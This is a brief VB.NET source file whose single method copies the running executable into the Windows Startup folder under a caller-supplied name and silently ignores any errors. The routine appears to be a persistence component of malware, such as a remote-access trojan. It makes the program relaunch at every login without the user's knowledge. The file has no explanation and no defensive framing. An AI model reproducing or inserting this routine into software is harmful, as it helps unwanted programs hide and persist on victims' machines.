Public Class Helpe
    Public Shared Sub startp(ByVal sl As String)

        Try
            Dim l As Byte() = IO.File.ReadAllBytes(IO.Path.GetFullPath(Application.ExecutablePath))


            IO.File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & sl & ".exe", l)

        Catch ex As Exception
        End Try

    End Sub
End Class
